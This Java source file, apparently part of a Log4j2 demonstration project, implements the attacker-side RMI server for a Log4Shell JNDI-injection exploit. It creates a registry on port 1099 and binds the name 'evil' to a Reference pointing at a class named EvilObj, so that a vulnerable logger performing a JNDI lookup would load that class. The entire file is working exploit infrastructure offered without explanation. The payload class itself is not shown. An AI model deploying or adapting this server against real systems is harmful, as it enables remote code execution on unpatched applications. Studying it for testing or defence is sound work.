package com.example.log4j2demo;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author youngbear
 * @email youngbear@aliyun.com
 * @date 2021/12/14 21:46
 * @blog https://blog.csdn.net/next_second
 * @github https://github.com/YoungBear
 * @description
 */
public class RMIServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("Create RMI registry on port 1099...");

            String className = "com.example.log4j2demo.EvilObj";
            Reference reference = new Reference(className, className, className);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
            System.out.println("registry bind ...");

        } catch (Exception e) {
            e.printStackTrace();

        }
    }
}
